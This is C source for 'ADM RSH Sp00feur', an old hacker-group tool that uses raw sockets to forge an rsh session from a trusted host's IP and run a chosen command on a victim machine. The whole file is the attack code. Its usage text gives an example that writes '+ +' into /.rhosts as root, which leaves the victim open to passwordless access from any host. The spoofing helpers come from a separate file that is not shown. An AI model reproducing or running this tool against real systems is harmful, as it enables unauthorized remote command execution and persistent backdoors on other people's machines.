
/************************************************************************/
/* ADM RSH Sp00feur ver 0.3 (c) ADM   		               		*/
/* note: i have found a VERY important bug in the function Sconnect     */
/* :/  but its fixed :) now he work very very nicely ;)                 */
/* Have Fun Ppl ! :)                                                    */
/*                          The ADM CreW                                */
/*  official ftp site: ftp.janova.org/pub/adm                           */ 
/************************************************************************/
 
 
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include "ADM-spoof.c"

 host2ip(char *serv)
{
   struct sockaddr_in sinn;
   struct hostent *hent;
      
  hent=gethostbyname(serv);
  if(hent == NULL) return 0;
  bzero((char *)&sinn, sizeof(sinn));
  bcopy(hent->h_addr, (char *)&sinn.sin_addr, hent->h_length);
  return sinn.sin_addr.s_addr;
 }
 
                     
main(int argc, char **argv)
   {       	                
	 unsigned   long       s_ip;
	 unsigned   long       d_ip;
         unsigned   long       da_ip,spoof_ack,spoof_seq,of2;                      
	 
	int s,s_r,off;
        int i=1, onn=1 , onn2=1;
        char *cmdptr;
        u_int sport;
	unsigned int DAPORT=514;
        char  cmd[512];
       

   
    if(argc<2){
    system("clear");
    printf("\n\n\n\n\n\n\n\n\n\t\t\t   =============================\n");
    printf("\t\t\t  =    $$$    $$$$$$   $$   $$  =\n");
    printf("\t\t\t ==  $$   $$  $$   $$  $$$ $$$  ==\n");
    printf("\t\t\t===  $$$$$$$  $$   $$  $$ $ $$  ===\n");
    printf("\t\t\t ==  $$   $$  $$   $$  $$   $$  ==\n");
    printf("\t\t\t  =  $$   $$  $$$$$$   $$   $$  =\n");
    printf("\t\t\t   =============================\n");
    printf("\t\t\t            RoX The NeTw0rk\n");
    sleep(1);
    system("clear");
    printf("		                 ADMrsh\n");
    printf("			         **==**\n\n");
    printf(" It's very easy to use (like all the ADM products).\n\n");
    printf(" ADMrsh [ips] [ipd] [ipl] [ps] [luser] [ruser] [cmd]  \n\n");
    printf(" Parameters List : \n");
    printf(" ips   =   ip source (ip of the trusted host)\n");
    printf(" ipd   =   ip destination (ip of the victim)\n");
    printf(" ipl   =   ip local (your ip to receive the informations)\n");
    printf(" ps    =   port source (between 0 and 1024)\n");
    printf(" luser =   local user\n");
    printf(" ruser =   remote user\n");
    printf(" cmd   =   command to execute\n\n");
    printf(" If ya don't understand, this is an example :\n\n");
    printf(" ADMrsh a.foo.us b.foo.us ppp.bad.org 1000 root root \"echo\\\"+ +\\\">/.rhosts\"\n\n"); 
    printf(" Greetz : ALL ADM CrEw & HeiKe \n");
    printf(" (c) ADM  <-- hehe ;) \n");
    exit(0);
    }
    
    
   memset(cmd,0,512);
   

	
	/* OPEN A RAW_SOCKET ! */;
         s_r=socket(AF_INET,SOCK_RAW,6);  	
	 s=socket(AF_INET, SOCK_RAW, 255);
	        if(s < 0)
	        {
	        fprintf(stderr, "cant open raw socket\n");
	        exit(0);
	        }
	
     
	        
	
	#ifdef IP_HDRINCL
	 if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&i, sizeof(i)) < 0)
	      {
	        fprintf(stderr, "cant set IP_HDRINCL\n");
	         close(s);
	        exit(0); }
	#endif
	 
	 d_ip = host2ip(argv[2]);
	 s_ip = host2ip(argv[1]);
         da_ip = host2ip(argv[3]);         
         sport=atoi(argv[4]);

cmdptr=cmd;
strcat(cmdptr,"0\0");
cmdptr=cmdptr+2;
strcat(cmdptr,argv[5]);
cmdptr=cmdptr+strlen(argv[5])+1;
strcat(cmdptr,argv[6]);
cmdptr=cmdptr+strlen(argv[6])+1;
strcat(cmdptr,argv[7]);
cmdptr=cmdptr+strlen(argv[7])+1;
         
 Sconnect(s,s_ip,d_ip,sport,DAPORT,da_ip);
 Swrite(s,cmd,strlen(argv[5])+strlen(argv[6])+strlen(argv[7])+2+3);
 
}
  
